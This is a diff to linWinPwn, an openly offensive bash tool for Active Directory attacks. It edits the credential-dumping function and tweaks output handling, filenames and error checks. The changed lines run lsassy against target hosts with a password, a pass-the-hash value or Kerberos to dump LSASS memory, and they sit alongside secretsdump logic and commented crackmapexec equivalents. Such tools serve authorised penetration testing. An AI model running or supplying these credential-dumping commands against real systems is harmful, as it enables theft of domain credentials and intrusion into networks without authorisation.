@@ -3,7 +3,7 @@
 # linWinPwn - alpha version (https://github.com/lefayjey/linWinPwn)
 # Author: lefayjey
 # Inspired by: S3cur3Th1sSh1t's WinPwn (https://github.com/S3cur3Th1sSh1t/WinPwn)
-# Latest update : 25/01/2022
+# Latest update : 27/01/2022
 #
 #      _        __        ___       ____                 
 #     | |(_)_ __\ \      / (_)_ __ |  _ \__      ___ __  
@@ -291,6 +291,7 @@ main () {
         esac
     done
     
+    echo -e ""
     echo -e "${GREEN}[+] All modules have completed. Output folder is: $(realpath $output_dir)${NC}"
     echo -e "${GREEN}------------------------------------------------${NC}"
 }
@@ -708,6 +709,8 @@ pwd_dump () {
             
             if grep -qi 'error' ${output_dir}/Credentials/secrets_dump_${dc_domain}_${i}.txt; then
                 echo -e "${RED}[-] Errors detected using secretsdump on ${i} ${NC}"
+            else
+                echo -e "${GREEN}[+]${NC} ${i} secretsdump completed"
             fi
         done
     fi
@@ -725,16 +728,16 @@ pwd_dump () {
                     echo -e "${PURPLE}[-] lsass dump requires credentials${NC}"
                     break
                 elif [ "${hash_bool}" == true ] ; then
-                    ${lsassy} -d ${domain} -u ${user} -H ${hash} -o ${output_dir}/Credentials/lsass_dump_${i}.txt -K ${output_dir}/Credentials/ -f grep $i > ${output_dir}/Credentials/lsass_output_${dc_domain}_${i}.txt 2>&1
+                    ${lsassy} -d ${domain} -u ${user} -H ${hash} -o ${output_dir}/Credentials/lsass_dump_${dc_domain}_${i}.txt -K ${output_dir}/Credentials/ -f grep $i | tee ${output_dir}/Credentials/lsass_output_${dc_domain}_${i}.txt 2>&1
                     #${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M lsassy > ${output_dir}/Credentials/lsass_dump_${dc_domain}_${i}.txt 2>&1
                 elif [ "${kerb_bool}" == true ] ; then
-                    ${lsassy} -d ${domain} -u ${user} -k -o ${output_dir}/Credentials/lsass_dump_${i}.txt -K ${output_dir}/Credentials/ -f grep $i 2>&1 > ${output_dir}/Credentials/lsass_output_${dc_domain}_${i}.txt
+                    ${lsassy} -d ${domain} -u ${user} -k -o ${output_dir}/Credentials/lsass_dump_${dc_domain}_${i}.txt -K ${output_dir}/Credentials/ -f grep $i 2>&1 | tee ${output_dir}/Credentials/lsass_output_${dc_domain}_${i}.txt
                     #${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -k -M lsassy > ${output_dir}/Credentials/lsass_dump_${dc_domain}_${i}.txt 2>&1
                 else
-                    ${lsassy} -d ${domain} -u ${user} -p ${password} -o ${output_dir}/Credentials/lsass_dump_${i}.txt -K ${output_dir}/Credentials/ -f grep $i > ${output_dir}/Credentials/lsass_output_${dc_domain}_${i}.txt 2>&1
+                    ${lsassy} -d ${domain} -u ${user} -p ${password} -o ${output_dir}/Credentials/lsass_dump_${dc_domain}_${i}.txt -K ${output_dir}/Credentials/ -f grep $i | tee ${output_dir}/Credentials/lsass_output_${dc_domain}_${i}.txt 2>&1
                     #${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -p ${password} -M lsassy > ${output_dir}/Credentials/lsass_dump_${dc_domain}_${i}.txt 2>&1
                 fi
-                if grep -q '[x]' ${output_dir}/Credentials/lsass_output_${i}.txt; then
+                if grep -q '\[x\]' ${output_dir}/Credentials/lsass_output_${dc_domain}_${i}.txt; then
                     echo -e "${RED}[-] Errors detected using lsassy on ${i} ${NC}"
                 fi
             done
@@ -749,7 +752,7 @@ pwd_dump () {
     fi
 
     if [ "${lsassy_bool}" == true ] ; then
-        if [ "$(/bin/ls ${output_dir}/Credentials/lsass_dump_* 2>/dev/null)" ] ; then
+        if [ "$(/bin/ls ${output_dir}/Credentials/lsass_dump_${dc_domain}_* 2>/dev/null)" ] ; then
             grep . -aH ${output_dir}/Credentials/lsass_dump_${dc_domain}_* 2>&1 | cut -d $'\t' -f 3,4,6 | sed "s/\t/:/g" | grep -v "$:" | sort -u | rev | cut -d "/" -f 1 | rev | sed "s/_/ /g;s/.txt:/\n/g;" | tee ${output_dir}/Credentials/all_lsass_dump_${dc_domain}.txt 2>&1
         fi
     fi
